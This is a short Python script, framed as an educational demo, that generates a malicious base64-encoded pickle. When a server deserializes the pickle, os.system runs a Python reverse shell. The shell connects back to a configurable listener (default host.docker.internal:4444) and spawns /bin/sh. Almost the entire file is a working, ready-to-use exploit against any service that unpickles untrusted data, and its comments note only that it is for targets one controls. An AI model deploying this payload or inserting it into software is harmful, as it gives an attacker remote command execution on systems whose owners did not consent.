# EDUCATIONAL DEMO ONLY. Generates a malicious pickle that opens a reverse shell
# back to YOUR listener when the server deserializes it. Point it only at a target
# you control. The mechanism: pickle calls __reduce__ during unpickling, so returning
# (os.system, (cmd,)) makes the deserializer run cmd.
import base64
import os
import pickle

HOST = os.environ.get("LISTENER_HOST", "host.docker.internal")
PORT = os.environ.get("LISTENER_PORT", "4444")

# A Python reverse shell (python is present in the target container).
CMD = (
    "python3 -c 'import socket,subprocess,os;"
    f's=socket.socket();s.connect(("{HOST}",{PORT}));'
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/sh\",\"-i\"])'"
)


class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))


if __name__ == "__main__":
    print(base64.b64encode(pickle.dumps(RCE())).decode())
